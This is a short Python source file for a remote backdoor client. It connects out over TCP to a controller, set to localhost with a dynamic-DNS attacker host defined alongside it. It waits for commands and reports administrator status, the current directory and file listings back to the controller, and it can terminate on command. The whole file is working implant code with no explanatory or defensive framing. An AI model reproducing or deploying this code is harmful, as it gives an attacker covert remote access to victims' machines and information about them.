import socket
import subprocess
import sys
import ctypes
import os

localhost = ('127.0.0.1', 8080)
devilnets = ("dynamicdnsyourown.ddns.net", 8080)
byte = int(0x00)

socket_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_client.connect(localhost)

Command = [b"privesc", b"ls", b"pwd", b"terminate"]

def privesc():
    shell = ctypes.windll.shell32.IsUserAnAdmin()
    if (shell > byte):
        data = socket_client.send(b'$USER: [ADMIN/Administrator]')
        send_a_data = data
        print(f"{send_a_data}")
    else:
        data = socket_client.send(b'$USER: [USER/Non-Administrator]')
        send_a_data = data
        print(f"{send_a_data}")

def Backdoor():
    while True:
        execute = socket_client.recv(2048)
        if b"privesc" in execute:
            privesc()

        if b"pwd" in execute:
            current_dir = os.getcwd()
            InBytes = f"{current_dir}"
            data = socket_client.sendall(InBytes.encode("utf-8"))

        if b"ls" in execute:
            current_dir = os.getcwd()
            content_dir = os.listdir(current_dir)
            InBytes = f"{content_dir}"
            data = socket_client.sendall(InBytes.encode("utf-8"))

        if b"terminate" in execute:
            socket_client.close()
            sys.exit()

if __name__ == '__main__':
    Backdoor()
